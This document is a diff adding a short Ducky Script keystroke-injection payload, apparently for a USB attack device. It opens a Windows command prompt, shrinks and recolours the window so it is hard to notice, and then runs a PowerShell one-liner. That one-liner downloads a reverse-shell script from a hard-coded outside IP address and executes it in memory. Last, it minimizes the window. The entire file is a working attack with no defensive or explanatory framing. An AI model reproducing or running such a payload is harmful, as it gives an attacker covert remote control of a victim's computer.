@@ -1,0 +1,16 @@
+REM @@ Opening the CMD
+GUI r 
+DELAY 500
+STRING cmd.exe
+ENTER 
+DELAY 200
+REM @@ Changing the color, risizing the CMD and executing the reverse shell in memory
+STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "iex(iwr 143.244.185.56:8080/minrev.ps1)"
+DELAY 200
+ENTER
+REM @@ Minimizing the CMD
+ALT SPACE
+DOWN
+DOWN
+DOWN
+ENTER
